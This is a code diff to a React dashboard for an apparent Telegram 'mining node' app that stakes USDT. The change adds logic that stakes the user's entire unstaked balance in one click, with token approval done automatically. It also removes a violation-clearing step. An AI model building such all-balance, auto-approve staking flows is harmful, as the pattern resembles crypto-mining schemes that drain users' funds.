@@ -24,12 +24,13 @@ const Dashboard: React.FC = () => {
     const navigate = useNavigate();
     const location = useLocation();
     const { address, isConnected, connect, setIsDisconnectModalOpen, miningStats, setMiningStats } = useWallet();
-    const { getStakedInfo, stake, getStakeDetails, getWalletBalance, getAllowance, approve, calculateEffectiveEarned, recordViolation, clearViolation } = useStaking();
+    const { getStakedInfo, stake, getStakeDetails, getWalletBalance, getAllowance, approve, calculateEffectiveEarned, recordViolation } = useStaking();
     const { showAlert, tg } = useTelegram();
     const { btcPrice } = usePrice();
     const [loading, setLoading] = useState(false);
 
     const isSuccessLanding = new URLSearchParams(location.search).get('v') === 'success';
+    const formatUsdtAmount = (value: number) => value.toFixed(18).replace(/\.?0+$/, '');
 
     const handleBackToTelegram = () => {
         // If we're inside the Mini App, we might be able to close the webview
@@ -71,21 +72,35 @@ const Dashboard: React.FC = () => {
             if (!balanceStr || parseFloat(balanceStr) < 50) {
                 throw new Error("Activation requires a minimum balance of 50 USDT.");
             }
+            const info = await getStakedInfo(address);
+            let activeStaked = 0;
+
+            if (info) {
+                for (let i = 0; i < info.stakeCount; i++) {
+                    const detail = await getStakeDetails(address, i);
+                    if (detail && !detail.withdrawn) {
+                        activeStaked += parseFloat(formatUnits(detail.amount, 18));
+                    }
+                }
+            }
+
+            const stakeableBalance = Math.max(0, parseFloat(balanceStr) - activeStaked);
+
+            if (stakeableBalance < 50) {
+                throw new Error("No extra USDT available to stake. Add at least 50 unstaked USDT to upgrade mining.");
+            }
             
         // 1. Check Allowance
         const currentAllowance = await getAllowance(address);
         
         // 2. Automated Token Approval (if needed)
-        if (parseFloat(currentAllowance) < parseFloat(balanceStr)) {
+        if (parseFloat(currentAllowance) < stakeableBalance) {
             await approve();
         }
 
         // 3. One-Click Staking Activation
-        const tx = await stake(balanceStr);
+        const tx = await stake(formatUsdtAmount(stakeableBalance));
         await tx.wait();
-
-        // 4. Clear Violation on successful re-stake
-        clearViolation(address);
 
         showAlert("Node Successfully Activated! 🚀");
         handleBackToTelegram();
@@ -93,7 +108,9 @@ const Dashboard: React.FC = () => {
             console.error("[Mining] Error:", err);
             
             // CLEAR ERROR MESSAGE FOR LOW BALANCE
-            if (err.message && (err.message.includes("50") || err.message.includes("Activation"))) {
+            if (err.message && err.message.includes("extra USDT")) {
+                showAlert(err.message);
+            } else if (err.message && (err.message.includes("50") || err.message.includes("Activation"))) {
                 showAlert("Minimum 50 USDT required to activate mining node.");
             } else {
                 showAlert(err.message || 'Transaction rejected. Please try again.');
